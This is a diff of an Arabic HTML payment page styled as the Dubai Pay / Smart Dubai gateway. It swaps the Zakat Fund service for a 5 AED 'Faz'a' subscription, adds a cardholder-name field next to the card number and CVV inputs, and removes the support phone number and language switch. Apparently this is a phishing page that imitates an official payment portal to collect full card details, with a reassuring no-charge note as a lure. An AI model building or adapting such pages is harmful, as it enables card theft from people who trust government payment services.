@@ -40,21 +40,14 @@
             display: flex;
             gap: 12px;
             align-items: center;
+            width: 100%;
+            justify-content: space-between;
         }
 
         .header-logo {
             height: 32px;
             width: auto;
             object-fit: contain;
-        }
-
-        .lang-btn {
-            background: none;
-            border: none;
-            color: #0066cc;
-            font-size: 14px;
-            cursor: pointer;
-            padding: 0;
         }
 
         .content {
@@ -147,7 +140,7 @@
 
         .cvv-row {
             display: grid;
-            grid-template-columns: 1fr 1fr;
+            grid-template-columns: 1fr;
             gap: 12px;
             align-items: flex-end;
         }
@@ -174,37 +167,15 @@
             object-fit: contain;
         }
 
-        .charity-section {
-            display: flex;
-            align-items: center;
-            gap: 12px;
+        .warning-note {
             padding: 12px;
-            background: #f9fafb;
-            border-radius: 6px;
+            background: #fef3c7;
+            border-left: 4px solid #f59e0b;
+            border-radius: 4px;
             margin: 20px 0;
-        }
-
-        .charity-checkbox {
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
-            flex-shrink: 0;
-        }
-
-        .charity-text {
-            flex: 1;
-        }
-
-        .charity-text strong {
-            display: block;
-            font-size: 14px;
-            color: #1f2937;
-        }
-
-        .charity-link {
-            color: #0066cc;
-            text-decoration: none;
             font-size: 13px;
+            color: #92400e;
+            line-height: 1.5;
         }
 
         .total-amount {
@@ -271,7 +242,7 @@
             color: #6b7280;
         }
 
-        .footer-phone {
+        .footer-copyright {
             font-weight: 600;
             color: #1f2937;
             margin-bottom: 4px;
@@ -296,7 +267,6 @@
                 <img src="/dubaipay.png" alt="Dubai Pay" class="header-logo">
                 <img src="/smart_dubai.png" alt="Smart Dubai" class="header-logo">
             </div>
-            <button class="lang-btn" onclick="switchLanguage()">English</button>
         </div>
 
         <!-- Main Content -->
@@ -307,11 +277,11 @@
                 <div class="transaction-info">
                     <div class="info-row">
                         <span class="info-label">مقدم الخدمة</span>
-                        <span class="info-value">صندوق الزكاة</span>
+                        <span class="info-value">فزعة</span>
                     </div>
                     <div class="info-row">
                         <span class="info-label">الخدمة</span>
-                        <span class="info-value">زكاة DD</span>
+                        <span class="info-value">الاشتراك في فزعة</span>
                     </div>
                     <div class="info-row">
                         <span class="info-label">رقم المعاملة</span>
@@ -319,7 +289,7 @@
                     </div>
                     <div class="info-row">
                         <span class="info-label">المبلغ</span>
-                        <span class="info-value">100.00 AED</span>
+                        <span class="info-value">5.00 AED</span>
                     </div>
                 </div>
             </div>
@@ -327,6 +297,12 @@
             <!-- Card Details -->
             <div class="section">
                 <div class="section-title">بيانات البطاقة</div>
+
+                <div class="form-group">
+                    <label for="cardholderName">اسم صاحب البطاقة</label>
+                    <input type="text" id="cardholderName" placeholder="أدخل اسم صاحب البطاقة" 
+                           oninput="validateCardholderName(this)">
+                </div>
 
                 <div class="form-group">
                     <label for="cardNumber">رقم البطاقة</label>
@@ -374,7 +350,6 @@
                     <div class="cvv-row">
                         <input type="text" id="cvv" placeholder="CW" maxlength="4" 
                                oninput="validateCVV(this)">
-                        <img src="/card_logos.png" alt="CVV" style="height: 32px; width: auto;">
                     </div>
                     <div class="cvv-info">
                         رمز الأمان (Security Code) هو آخر ثلاثة أرقام من الرقم الموجود على ظهر بطاقتك الائتمانية بالقرب من خط التوقيع.
@@ -389,22 +364,15 @@
                 <img src="/pci_dss.png" alt="PCI DSS" class="badge">
             </div>
 
-            <!-- Charity Section -->
-            <div class="charity-section">
-                <input type="checkbox" id="charityCheckbox" class="charity-checkbox">
-                <div class="charity-text">
-                    <strong>تبرع لجمعية "ديرهام الخير"</strong>
-                    <a href="#" class="charity-link">اعرف المزيد</a>
-                </div>
-                <div style="width: 40px; height: 40px; display: flex; align-items: center; justify-content: center;">
-                    <span style="font-size: 24px;">🤝</span>
-                </div>
+            <!-- Warning Note -->
+            <div class="warning-note">
+                في حالة عدم الموافقة على طلبك، لن يتم خصم منك أي رسوم
             </div>
 
             <!-- Total Amount -->
             <div class="total-amount">
                 <div class="total-label">إجمالي المبلغ</div>
-                <div class="total-value">100.00 AED</div>
+                <div class="total-value">5.00 AED</div>
             </div>
 
             <!-- Buttons -->
@@ -416,12 +384,22 @@
 
         <!-- Footer -->
         <div class="footer">
-            <div class="footer-phone">للاستفسارات يرجى الاتصال 600 560 000</div>
-            <div>حقوق الطبع والنشر © 2020. جميع الحقوق محفوظة.</div>
+            <div class="footer-copyright">جميع الحقوق محفوظة لـ فزعة</div>
+            <div>© 2020</div>
         </div>
     </div>
 
     <script>
+        function validateCardholderName(input) {
+            const value = input.value;
+            // Allow only Arabic and English letters and spaces
+            if (value && !/^[a-zA-Z\u0600-\u06FF\s]*$/.test(value)) {
+                input.style.borderColor = '#ef4444';
+            } else {
+                input.style.borderColor = '#d1d5db';
+            }
+        }
+
         function formatAndValidateCardNumber(input) {
             let value = input.value.replace(/\s/g, '');
             let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
@@ -486,10 +464,6 @@
 
         function goBack() {
             window.history.back();
-        }
-
-        function switchLanguage() {
-            window.location.href = '/payment.html';
         }
     </script>
 </body>
